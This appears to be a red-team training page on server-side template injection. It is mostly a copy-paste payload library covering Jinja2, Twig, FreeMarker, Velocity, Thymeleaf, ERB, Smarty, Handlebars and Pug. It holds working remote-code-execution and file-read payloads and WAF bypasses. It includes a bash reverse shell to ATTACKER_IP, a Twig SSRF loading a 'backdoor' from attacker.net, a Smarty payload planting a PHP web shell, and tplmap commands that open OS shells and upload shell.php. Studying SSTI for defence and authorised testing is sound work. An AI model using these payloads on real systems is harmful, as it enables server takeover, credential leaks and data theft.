---
layout: training-page
title: "SSTI — Server-Side Template Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - ssti
  - template-injection
  - rce
  - jinja2
  - twig
  - freemarker
page_key: "web-ssti"
render_with_liquid: false
---

# SSTI — Server-Side Template Injection

Server-Side Template Injection (SSTI) occurs when user input is embedded unsafely into a template engine and evaluated server-side. Unlike reflected XSS (client-side), SSTI runs in the server's context — it typically leads to Remote Code Execution. SSTI affects applications using Jinja2, Twig, Mako, Velocity, Freemarker, Pebble, Smarty, Handlebars, and others.

## Detection — Universal Probes

```
# Inject into every parameter — look for mathematical evaluation in the response:
{{7*7}}         → 49  (Jinja2, Twig, Twirl)
${7*7}          → 49  (FreeMarker, Velocity, Groovy)
#{7*7}          → 49  (Thymeleaf)
<%= 7*7 %>      → 49  (ERB/Ruby, EJS)
{7*7}           → 49  (Smarty)
${{7*7}}        → 49  (some Java/Spring EL)

# Polyglot probe (triggers multiple engines simultaneously):
${{<%[%'"}}%\.

# Differentiate Jinja2 vs Twig:
{{7*'7'}}    → 7777777 (Jinja2 — repeats string 7 times)
             → 49      (Twig — numeric)

# Automation — test all parameters at scale:
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/
# Look for responses containing "ssti81" (9*9=81)
```

## Jinja2 (Python — Flask, Django)

```
# Basic RCE via __class__ chain:
{{ ''.__class__.__mro__[1].__subclasses__() }}      # list all classes

# Find index of subprocess.Popen or os._wrap_close:
{{ ''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate() }}
# Index varies per Python version — enumerate to find the right one

# Via config object (Flask):
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Via request object (Flask):
{{ request.__class__.__mro__[8].__subclasses__()[40]('/etc/passwd').read() }}

# Direct os import (if not sandboxed):
{% import os %}{{ os.system('id') }}
{% import os %}{{ os.popen('id').read() }}

# Read /etc/passwd:
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Reverse shell via Jinja2:
{{ ''.__class__.__mro__[1].__subclasses__()[408]('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"', shell=True) }}

# Leak Flask secret key (for cookie forgery):
{{ config.SECRET_KEY }}
{{ config }}

# tplmap automated exploitation:
tplmap -u 'http://www.target.com/page?name=John'
tplmap -u 'http://target.com/?name=*' --os-shell
tplmap -u 'http://target.com/?name=*' --os-cmd 'id'
```

## Twig (PHP — Symfony, Craft CMS)

```
# Detect:
{{7*7}}       → 49
{{7*'7'}}     → 49  (unlike Jinja2)

# Read file:
{{ '/etc/passwd'|file_excerpt(1,30) }}
{{ source('/etc/passwd') }}

# Execute command (Twig < 1.20 — no longer available in modern versions):
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}

# Server info:
{{ app.request.server.all|join(',') }}
{{dump(app)}}

# SSRF via template cache:
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

## FreeMarker (Java)

```
# Detect:
${7*7}    → 49
#{7*7}    → 49

# RCE:
<#assign command="freemarker.template.utility.Execute"?new()>${ command("id") }
<#assign command="freemarker.template.utility.Execute"?new()>${ command("cat /etc/passwd") }

# Alternative:
${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Read environment variables:
${T(java.lang.System).getenv()}

# File read:
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

## Velocity (Java)

```
# Detect:
${7*7}    → 49

# RCE:
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Thymeleaf (Java — Spring)

```
# Detect:
#{7*7}         → 49
__${7*7}__     → 49  (in fragment expressions)

# SpEL injection via Thymeleaf:
__$%7bnew+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()%7d__::.x

# RCE via Spring expression:
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String[]){'sh','-c','id'}).getInputStream())}
```

## ERB (Ruby on Rails)

```
# Detect:
<%= 7*7 %>    → 49

# RCE:
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").readlines() %>

# File read:
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
```

## Smarty (PHP)

```
# Detect:
{$smarty.version}
{7*7}     → 49

# RCE (Smarty < 3.1.30):
{php}echo `id`;{/php}
{php}system("id");{/php}
{php}$s = file_get_contents('/etc/passwd'); echo $s;{/php}

# Smarty 3.x+ (php tag disabled by default — use string functions):
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Handlebars (Node.js)

```
# Detect:
{{7*7}}    → 49 (or no evaluation — depends on version)

# Sandbox escape RCE:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## Node.js (Pug / Jade)

```
# Detect:
#{7*7}    → 49

# RCE via global process object:
- global.process.mainModule.require('child_process').execSync('id').toString()

# In URL/input context:
#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}
```

## Automated Testing with tplmap

```
# tplmap — automatic SSTI detection and exploitation:
git clone https://github.com/epinna/tplmap
pip3 install -r requirements.txt

# Basic detection:
python3 tplmap.py -u 'http://target.com/page?name=John'

# Interactive OS shell:
python3 tplmap.py -u 'http://target.com/?name=*' --os-shell

# Run single command:
python3 tplmap.py -u 'http://target.com/?name=*' --os-cmd 'id'

# Upload file:
python3 tplmap.py -u 'http://target.com/?name=*' --upload /tmp/shell.php /var/www/html/

# POST body injection:
python3 tplmap.py -u 'http://target.com/login' -d 'username=*&password=pass'

# Custom injection marker (*):
python3 tplmap.py -u 'http://target.com/profile?bio=hello*world'
```

## WAF / Filter Bypass

```
# Bypass underscore filter (Jinja2):
{{ request['__class__']['__mro__'][1]['__subclasses__']()[40]('/etc/passwd').read() }}

# Use |attr filter:
{{ ''|attr('__class__')|attr('__mro__')|list }}

# Hex encoding:
{{ ''['\x5f\x5fclass\x5f\x5f'] }}

# Bypass keyword filters with string concatenation:
{% set a = '__cla' %}{% set b = 'ss__' %}{{ ''[a~b] }}

# Bypass space filter:
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=1,stdout=-1).communicate()[0].strip()}}
# → use tabs or no spaces

# Bypass dot notation with brackets:
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
```

## SSTI Payload Library by Engine

Quick reference payloads from PayloadsAllTheThings — one-liners per engine for copy-paste use.

```
# Jinja2 (Python/Flask) — RCE via __subclasses__:
{{ ''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()[0].strip() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ config.SECRET_KEY }}

# Jinja2 via request object (Flask):
{{ request['__class__']['__mro__'][1]['__subclasses__']()[40]('/etc/passwd').read() }}

# Twig (PHP) — file read and SSRF:
{{ source('/etc/passwd') }}
{{ '/etc/passwd'|file_excerpt(1,30) }}
{{ _self.env.setCache("ftp://attacker.net:2121") }}{{ _self.env.loadTemplate("backdoor") }}

# FreeMarker (Java) — RCE:
<#assign command="freemarker.template.utility.Execute"?new()>${ command("id") }
<#assign command="freemarker.template.utility.Execute"?new()>${ command("cat /etc/passwd") }

# Velocity (Java) — RCE:
#set($ex="freemarker.template.utility.Execute"?new())
$ex.exec(["id"])

# Thymeleaf (Java/Spring) — SpEL injection:
__$%7bnew+java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next()%7d__::.x

# ERB (Ruby) — RCE:
<%= system("id") %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>

# Smarty (PHP) — RCE (<3.1.30):
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

# Handlebars (Node.js) — sandbox escape RCE:
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

# Pug/Jade (Node.js) — RCE:
- global.process.mainModule.require('child_process').execSync('id').toString()
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

## SSTI Detection Polyglots

Universal detection payloads from PayloadsAllTheThings to identify engine type without prior knowledge.

```
# Polyglot to trigger error in all major engines simultaneously:
${{<%[%'"}}%\.

# Mathematical expression probe (rendered = SSTI confirmed):
{{7*7}}     → 49  (Jinja2, Twig)
${7*7}      → 49  (FreeMarker, Velocity, Groovy)
#{7*7}      → 49  (Thymeleaf, Pug)
<%= 7*7 %> → 49  (ERB)
{7*7}       → 49  (Smarty)

# Error-based detection (look at error message to identify engine):
{{(1/0).zxy.zxy}}   -- triggers verbose error

# Engine identification from error messages:
# ZeroDivisionError           → Python (Jinja2)
# java.lang.ArithmeticException → Java (FreeMarker/Velocity)
# ReferenceError / TypeError  → Node.js (Handlebars/Pug)
# Division by zero            → PHP (Twig/Smarty)
# divided by 0                → Ruby (ERB)
# Arithmetic operation failed → FreeMarker

# Boolean-Based blind detection:
# Pair 1 (true):  {{8*8}} → 64 rendered
# Pair 2 (false): {{8*'8'}} → 7777777 (Jinja2) or 64 (Twig) — differentiates engines

# Automated scanning with TInjA:
tinja url -u "http://example.com/?name=Kirlia" -H "Authorization: Bearer TOKEN"
tinja url -u "http://example.com/" -d "username=Kirlia"

# SSTImap (interactive exploitation):
python3 sstimap.py -u 'https://target/?name=John' -s
python3 sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic BASE64'
```

## Resources

- tplmap — SSTI exploitation tool — `github.com/epinna/tplmap`
- PortSwigger SSTI labs — `portswigger.net/web-security/server-side-template-injection`
- PayloadsAllTheThings SSTI — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection`
- SSTI payloads collection — `github.com/payloadbox/ssti-payloads`
- HackTricks SSTI — `book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`
- MITRE ATT&CK T1059 — Command and Scripting Interpreter — `attack.mitre.org/techniques/T1059/`
